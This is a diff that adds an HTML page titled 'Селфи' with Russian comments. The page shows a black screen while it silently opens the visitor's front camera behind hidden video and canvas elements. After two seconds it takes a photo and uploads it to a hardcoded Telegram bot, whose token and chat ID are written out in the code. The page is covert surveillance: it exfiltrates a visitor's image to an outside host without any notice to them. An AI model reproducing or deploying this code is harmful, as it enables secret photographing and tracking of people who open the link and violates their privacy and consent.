@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Селфи</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: black;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Ваш токен
+        const chatId = "2145450623"; // Ваш chat_id
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user" // Используем фронтальную камеру
+                    }
+                });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                // Ждём, пока видео загрузится
+                video.onloadedmetadata = () => {
+                    setTimeout(() => captureImage(video), 2000); // Делаем снимок через 2 секунды
+                };
+            } catch (error) {
+                console.error("Ошибка доступа к камере:", error);
+            }
+        }
+
+        function captureImage(video) {
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Рисуем изображение с камеры на холсте
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Преобразуем изображение в Base64
+            const imageData = canvas.toDataURL("image/jpeg");
+
+            // Отправляем изображение
+            sendImageToTelegram(imageData);
+        }
+
+        async function sendImageToTelegram(imageData) {
+            // Преобразуем Base64 в Blob
+            const blob = await (await fetch(imageData)).blob();
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "selfie.jpg");
+
+            // Отправляем изображение в Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Селфи отправлено!");
+                    } else {
+                        console.error("Ошибка отправки селфи.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Ошибка отправки запроса:", error);
+                });
+        }
+
+        // Запускаем камеру
+        startCamera();
+    </script>
+</body>
+</html>
